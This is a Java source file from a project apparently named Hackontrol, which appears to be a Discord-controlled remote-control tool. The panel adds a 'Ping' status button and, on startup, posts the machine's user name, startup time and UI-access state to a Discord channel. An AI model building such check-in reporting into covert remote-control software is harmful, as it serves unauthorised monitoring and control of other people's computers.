package com.khopan.hackontrol.panel;

import com.khopan.hackontrol.Hackontrol;
import com.khopan.hackontrol.manager.interaction.ButtonManager;
import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.nativelibrary.Information;
import com.khopan.hackontrol.registry.Registration;
import com.khopan.hackontrol.utils.HackontrolMessage;
import com.khopan.hackontrol.widget.ControlWidget;

import net.dv8tion.jda.api.interactions.components.buttons.Button;

public class HackontrolPanel extends Panel {
	public static final String PANEL_NAME = "hackontrol";

	private static final Button BUTTON_PING = ButtonManager.staticButton(ButtonType.SUCCESS, "Ping", "ping");

	@Override
	public String panelName() {
		return HackontrolPanel.PANEL_NAME;
	}

	@Override
	public void registeration() {
		this.register(Registration.BUTTON, HackontrolPanel.BUTTON_PING, context -> HackontrolMessage.deletable(context.reply(), "**Status: Ok**"));
	}

	@Override
	public ControlWidget[] controlWidget() {
		return new ControlWidget[] {
				ControlWidget.newBuilder()
				.actionRow(HackontrolPanel.BUTTON_PING)
				.build()
		};
	}

	@Override
	public void initialize() {
		long time = Hackontrol.STARTUP_TIME / 1000L;
		this.channel.sendMessage("**Online: <t:" + time + ":f> (<t:" + time + ":R>) (" + Information.getUserName() + ") (" + (Information.isEnabledUIAccess() ? "" : "No ") + "UI Access)**").queue();
	}
}
